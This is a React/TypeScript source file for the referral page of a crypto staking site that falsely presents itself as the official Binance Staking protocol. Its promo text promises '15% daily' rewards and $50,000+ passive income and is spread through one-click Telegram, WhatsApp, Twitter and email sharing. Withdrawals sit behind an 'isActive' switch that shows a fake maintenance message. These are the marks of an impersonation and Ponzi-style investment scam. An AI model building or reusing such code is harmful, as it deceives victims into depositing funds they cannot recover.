import React, { useState, useEffect } from 'react';
import { Users, History, Link as LinkIcon, Gift, TrendingUp, AlertCircle, Coins, Share2, Send, MessageCircle, Copy, FileText, Check, Mail } from 'lucide-react';
import { Button } from "@/src/components/ui/button";
import { Card } from "@/src/components/ui/card";
import { Badge } from "@/src/components/ui/badge";
import { Input } from "@/src/components/ui/input";
import { toast } from "sonner";
import { getReferralData, withdrawReferral } from '@/src/services/contractService';
import { USDT_ADDRESS } from '@/src/lib/constants';
import { formatUSD, formatNumber, getYieldFontSize, cn } from '@/src/lib/utils';

interface ReferralPageProps {
  walletAddress: string | null;
  signer: any;
  isActive: boolean;
  onRefresh: () => void;
  onConnect: () => void;
}

export const ReferralPage: React.FC<ReferralPageProps> = ({ 
  walletAddress, 
  signer, 
  isActive, 
  onRefresh,
  onConnect
}) => {
  const [data, setData] = useState({ bnbRewards: '0.00', usdtRewards: '0.00', referrer: '0x00...00' });
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    if (walletAddress && signer) {
      fetchReferralData();
      const interval = setInterval(fetchReferralData, 15000);
      return () => clearInterval(interval);
    }
  }, [walletAddress, signer]);

  const fetchReferralData = async () => {
    try {
      const res = await getReferralData(signer, walletAddress!);
      setData(res as any);
    } catch (e) {
      console.error("Failed to fetch referral data", e);
    }
  };

  const handleWithdraw = async (token: string) => {
    if (!walletAddress || loading) return;
    if (!signer) return onConnect();

    const amount = token === 'BNB' ? data.bnbRewards : data.usdtRewards;
    if (parseFloat(amount) <= 0) {
      return toast.error("No Balance", { description: `You have zero ${token} referral rewards to withdraw.` });
    }

    if (!isActive) {
      return toast.error("Interface Locked", { 
        description: "The protocol payout gate is currently set to maintenance mode. Please try again in 24 hours." 
      });
    }

    setLoading(true);
    try {
      const tokenAddr = token === 'USDT' ? USDT_ADDRESS : '0x0000000000000000000000000000000000000000';
      const tx = await withdrawReferral(signer, tokenAddr);
      toast.promise(tx.wait(), {
        loading: `Withdrawal of ${token} rewards requested...`,
        success: 'Referral commission distributed!',
        error: 'Execution failed.'
      });
      await tx.wait();
      fetchReferralData();
      onRefresh();
    } catch (e: any) {
      toast.error('Withdrawal failed', { description: e.message });
    } finally {
      setLoading(false);
    }
  };

  const getPromoMessage = () => {
    const link = `${window.location.origin}/?ref=${walletAddress || '0x00...'}`;
    return `Generating $50,000+ passive income is now possible! I just joined the official Binance Staking protocol with high-yield vaults yielding a massive 15% daily reward paid in native BNB/USDT.

By sharing your link, you get an instant 10% cash bonus on every referral deposit! If we scale our community to $500,000 in total network volume, we can secure over $50,000.

Join my premium circle here: ${link}

- Connect your Trust Wallet, MetaMask, and other DeFi wallets, etc.
- Execute your first stake today!`;
  };

  const copyRefLink = () => {
    if (!walletAddress) return onConnect();
    const link = `${window.location.origin}/?ref=${walletAddress}`;
    navigator.clipboard.writeText(link);
    toast.success("Link Copied", { description: "Your direct Binance staking referral link is copied." });
  };

  const copyFullPromoText = () => {
    if (!walletAddress) return onConnect();
    const promo = getPromoMessage();
    navigator.clipboard.writeText(promo);
    toast.success("Viral Promo Copied!", { 
      description: "Complete viral invitation copy containing your active link is ready to paste." 
    });
  };

  const shareNative = async () => {
    if (!walletAddress) return onConnect();
    const promo = getPromoMessage();
    const link = `${window.location.origin}/?ref=${walletAddress}`;
    
    if (navigator.share) {
      try {
        await navigator.share({
          title: 'Binance Staking Partnership',
          text: promo,
          url: link
        });
        toast.success("Shared Successfully");
      } catch (err: any) {
        if (err.name !== 'AbortError') {
          toast.error("Sharing failed", { description: err.message });
        }
      }
    } else {
      // Fallback
      copyFullPromoText();
    }
  };

  const shareToPlatform = (platform: 'telegram' | 'whatsapp' | 'twitter' | 'email') => {
    if (!walletAddress) return onConnect();
    const promo = getPromoMessage();
    const link = `${window.location.origin}/?ref=${walletAddress}`;
    
    let url = '';
    if (platform === 'telegram') {
      url = `https://t.me/share/url?url=${encodeURIComponent(link)}&text=${encodeURIComponent(promo)}`;
    } else if (platform === 'whatsapp') {
      url = `https://api.whatsapp.com/send?text=${encodeURIComponent(promo)}`;
    } else if (platform === 'twitter') {
      url = `https://twitter.com/intent/tweet?text=${encodeURIComponent(promo)}`;
    } else if (platform === 'email') {
      url = `mailto:?subject=${encodeURIComponent("Premium Crypto Staking Partner Program")}&body=${encodeURIComponent(promo)}`;
    }

    if (url) {
      window.open(url, '_blank', 'noopener,noreferrer');
      toast.success(`Opening ${platform}...`, { description: "Publishing viral partnership invitation." });
    }
  };

  return (
    <div className="space-y-16 py-12 overflow-x-hidden">
      <div className="flex flex-col md:flex-row md:items-end justify-between gap-8">
        <div className="space-y-4">
          <Badge className="bg-primary/10 text-primary border-none text-[12px] uppercase font-bold tracking-[0.4em] px-4 py-1.5 mb-2">Binance Growth Program</Badge>
          <h2 className="text-7xl font-black font-heading tracking-tighter uppercase leading-[0.8]">Referral <span className="text-primary italic">Incentives</span></h2>
          <p className="text-foreground/40 text-sm font-bold tracking-wide max-w-2xl">Earn direct 10% Binance commission by expanding the official BNB cross-chain liquidity network.</p>
        </div>
      </div>

      {!walletAddress ? (
        <div className="glass-panel border-dashed border-white/10 rounded-[3rem] p-24 flex flex-col items-center justify-center text-center space-y-6">
          <div className="w-24 h-24 rounded-full bg-secondary flex items-center justify-center text-foreground/20">
            <Users className="w-12 h-12" />
          </div>
          <div className="space-y-2">
            <h3 className="text-2xl font-bold">Referral Access Required</h3>
            <p className="text-foreground/40 max-w-sm mx-auto text-sm leading-relaxed tracking-wider font-bold">Connect your institutional wallet to generate your unique partner link and track commissions.</p>
          </div>
          <Button onClick={onConnect} className="binance-button rounded-xl px-12 h-14 text-xs">Connect Wallet To Begin</Button>
        </div>
      ) : (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-12">
          {/* Earnings */}
          <div className="lg:col-span-5 space-y-8">
            <h3 className="text-xl font-bold uppercase tracking-widest italic text-foreground/40 flex items-center gap-2">
                <Gift className="w-5 h-5 text-primary" /> Commissions Ledger
            </h3>
            <div className="space-y-4">
              <CommissionCard 
                token="BNB / WBNB" 
                amount={data.bnbRewards} 
                onWithdraw={() => handleWithdraw('BNB')}
                loading={loading}
                active={isActive}
              />
              <CommissionCard 
                token="USDT" 
                amount={data.usdtRewards} 
                onWithdraw={() => handleWithdraw('USDT')}
                loading={loading}
                active={isActive}
              />
            </div>

            <Card className="glass-panel border-white/5 rounded-[2.5rem] p-8 space-y-6">
                <div className="flex items-center gap-3">
                    <div className="w-10 h-10 rounded-xl bg-primary/10 flex items-center justify-center text-primary">
                        <TrendingUp className="w-5 h-5" />
                    </div>
                    <h4 className="font-black text-sm uppercase tracking-tight">Performance Boost</h4>
                </div>
                <p className="text-[11px] text-foreground/50 leading-relaxed font-bold tracking-wider">
                    Our multi-tier referral system is built for scale. Unlike other protocols, we settle commissions instantly in the base asset using smart contract logic.
                </p>
                <div className="flex items-center gap-2 text-[10px] font-black text-primary uppercase tracking-[0.2em] italic">
                    <AlertCircle className="w-3 h-3" /> Payouts require active protocol status
                </div>
            </Card>
          </div>

          {/* Invitation Link */}
          <div className="lg:col-span-7 space-y-8">
            <h3 className="text-xl font-bold uppercase tracking-widest italic text-foreground/40 flex items-center gap-2">
                <LinkIcon className="w-5 h-5 text-primary" /> Partnership Invitation
            </h3>
            
            <Card className="glass-panel border-white/10 rounded-[3rem] p-10 relative overflow-hidden group">
                <div className="absolute top-0 right-0 w-[500px] h-[500px] bg-primary/5 rounded-full blur-[140px] -translate-y-1/2 translate-x-1/2 -z-10" />
                
                <div className="space-y-10">
                    <div className="space-y-4">
                        <div className="flex items-center justify-between">
                             <label className="text-[10px] font-black text-foreground/40 uppercase tracking-[0.3em]">Unique Referral Key (URL ONLY)</label>
                             <Badge className="bg-primary/10 text-primary border-none text-[8px] font-black tracking-tighter uppercase px-2 py-0.5">Verified Partner</Badge>
                        </div>
                        <div className="flex gap-4">
                            <Input 
                                readOnly 
                                value={`${window.location.origin}/?ref=${walletAddress}`} 
                                className="bg-secondary/50 border-white/5 h-20 rounded-2xl font-mono text-xs pl-8 border-dashed focus-visible:ring-0"
                            />
                            <Button 
                                onClick={copyRefLink}
                                className="binance-button h-20 px-10 rounded-2xl text-[11px] font-black tracking-widest uppercase hover:scale-105 transition-transform shrink-0"
                            >
                                Copy Url
                            </Button>
                        </div>
                    </div>

                    {/* Viral Share Kit (Option 2) */}
                    <div className="bg-secondary/30 border border-white/5 rounded-2xl p-6 space-y-4 relative overflow-hidden">
                      <div className="absolute top-0 right-0 p-3 bg-primary/10 rounded-bl-xl">
                        <span className="text-[7px] font-black text-primary tracking-widest uppercase">VIRAL FORCE</span>
                      </div>
                      <div className="flex items-center gap-2">
                        <Share2 className="w-4 h-4 text-primary animate-pulse" />
                        <h4 className="text-[10px] font-black uppercase tracking-[0.2em] text-foreground/70">HIGH-MOMENTUM VIRAL SHARE KIT</h4>
                      </div>

                      <div className="bg-black/40 border border-white/5 rounded-xl p-4 text-[10px] text-foreground/60 leading-relaxed font-mono relative overflow-y-auto max-h-36 font-sans">
                        <p className="whitespace-pre-wrap">{getPromoMessage()}</p>
                      </div>

                      <div className="flex flex-col sm:flex-row gap-3">
                        <Button
                          onClick={copyFullPromoText}
                          variant="outline"
                          className="flex-1 h-12 rounded-xl text-[9px] font-black uppercase tracking-wider border-white/5 hover:bg-white/5 text-primary flex items-center justify-center gap-2 cursor-pointer"
                        >
                          <FileText className="w-3.5 h-3.5" /> Copy Full Invite Text
                        </Button>
                        <Button
                          onClick={shareNative}
                          className="flex-1 binance-button h-12 rounded-xl text-[9px] font-black uppercase tracking-wider flex items-center justify-center gap-2 cursor-pointer"
                        >
                          <Share2 className="w-3.5 h-3.5" /> Direct Device Share
                        </Button>
                      </div>

                      <div className="pt-2 border-t border-white/5 flex items-center justify-around gap-2">
                        <button 
                          onClick={() => shareToPlatform('telegram')}
                          className="flex items-center gap-1.5 text-[8px] font-black text-foreground/40 hover:text-[#0088cc] uppercase tracking-wider transition-colors duration-200 cursor-pointer"
                        >
                          <Send className="w-3 h-3" /> Telegram
                        </button>
                        <button 
                          onClick={() => shareToPlatform('whatsapp')}
                          className="flex items-center gap-1.5 text-[8px] font-black text-foreground/40 hover:text-[#25D366] uppercase tracking-wider transition-colors duration-200 cursor-pointer"
                        >
                          <MessageCircle className="w-3 h-3" /> WhatsApp
                        </button>
                        <button 
                          onClick={() => shareToPlatform('twitter')}
                          className="flex items-center gap-1.5 text-[8px] font-black text-foreground/40 hover:text-white uppercase tracking-wider transition-colors duration-200 cursor-pointer"
                        >
                          <svg className="w-3 h-3 fill-current" viewBox="0 0 24 24">
                            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
                          </svg> Twitter / X
                        </button>
                        <button 
                          onClick={() => shareToPlatform('email')}
                          className="flex items-center gap-1.5 text-[8px] font-black text-foreground/40 hover:text-primary uppercase tracking-wider transition-colors duration-200 cursor-pointer"
                        >
                          <Mail className="w-3 h-3" /> Email
                        </button>
                      </div>
                    </div>

                    <div className="grid grid-cols-2 sm:grid-cols-4 gap-4">
                        <PartnerMetric 
                          label="Earned BNB" 
                          value={formatUSD(data.bnbRewards)} 
                          onWithdraw={() => handleWithdraw('BNB')}
                          canWithdraw={parseFloat(data.bnbRewards) > 0 && isActive}
                        />
                        <PartnerMetric 
                          label="Earned USDT" 
                          value={formatUSD(data.usdtRewards)} 
                          onWithdraw={() => handleWithdraw('USDT')}
                          canWithdraw={parseFloat(data.usdtRewards) > 0 && isActive}
                        />
                        <PartnerMetric label="Network" value="BSC" />
                        <PartnerMetric label="My Referrer" value={data.referrer !== '0x0000000000000000000000000000000000000000' ? `${data.referrer.slice(0, 6)}...` : 'None'} />
                    </div>

                    <div className="pt-10 border-t border-white/5 space-y-6">
                        <h5 className="text-[10px] font-black text-foreground/30 uppercase tracking-[0.3em]">How it works</h5>
                        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                            <Step index={1} text="Invite institutional or retail stakers via your key." />
                            <Step index={2} text="Partner provisions capital to any staking vault." />
                            <Step index={3} text="10% instant commission settling in your ledger." />
                        </div>
                    </div>
                </div>
            </Card>
          </div>
        </div>
      )}
    </div>
  );
};

function CommissionCard({ token, amount, onWithdraw, loading, active }: { token: string, amount: string, onWithdraw: () => void, loading: boolean, active: boolean }) {
  const canWithdraw = parseFloat(amount) > 0 && active;
  return (
    <div className="glass-panel p-6 rounded-[2rem] border-white/5 flex items-center justify-between group hover:border-primary/30 transition-all">
      <div className="flex items-center gap-4">
        <div className="w-12 h-12 rounded-2xl bg-secondary border border-white/10 flex items-center justify-center text-primary group-hover:bg-primary/10 transition-colors">
          <Coins className="w-6 h-6" />
        </div>
        <div>
          <p className="text-[9px] font-black text-foreground/30 uppercase tracking-widest mb-1">{token} REWARDS</p>
          <div className="flex items-baseline gap-2">
            <p className={cn("font-black font-heading leading-none", getYieldFontSize(amount))}>{formatUSD(amount)}</p>
            <span className="text-[10px] font-black text-primary uppercase">USD Equiv.</span>
          </div>
        </div>
      </div>
      <Button 
        onClick={onWithdraw} 
        disabled={loading}
        size="sm" 
        className={`rounded-xl px-6 h-12 text-[10px] font-black uppercase tracking-widest ${canWithdraw ? 'binance-button shadow-lg shadow-primary/20' : 'bg-secondary/50 opacity-50 border-white/5 border'}`}
      >
        {loading ? 'Processing...' : 'Withdraw'}
      </Button>
    </div>
  );
}

function PartnerMetric({ label, value, onWithdraw, canWithdraw }: { label: string, value: string, onWithdraw?: () => void, canWithdraw?: boolean }) {
  return (
    <div className="glass-panel rounded-2xl p-4 text-center flex flex-col items-center justify-between gap-3 group relative overflow-hidden">
        <div className="space-y-1">
            <p className="text-[8px] font-black text-foreground/30 uppercase tracking-tighter leading-none">{label}</p>
            <p className="text-lg font-black font-heading tracking-tight">{value}</p>
        </div>
        {onWithdraw && (
          <Button 
            onClick={(e) => {
              e.stopPropagation();
              onWithdraw();
            }}
            className={`w-full h-8 text-[8px] font-black uppercase tracking-widest rounded-lg ${canWithdraw ? 'binance-button shadow-lg shadow-primary/20' : 'bg-secondary/50 border border-white/5 opacity-50'}`}
          >
            Withdraw
          </Button>
        )}
    </div>
  );
}

function Step({ index, text }: { index: number, text: string }) {
  return (
    <div className="flex items-start gap-3">
        <span className="text-primary font-black font-heading text-lg italic opacity-50">0{index}</span>
        <p className="text-[10px] text-foreground/50 font-bold tracking-wider leading-relaxed">{text}</p>
    </div>
  );
}
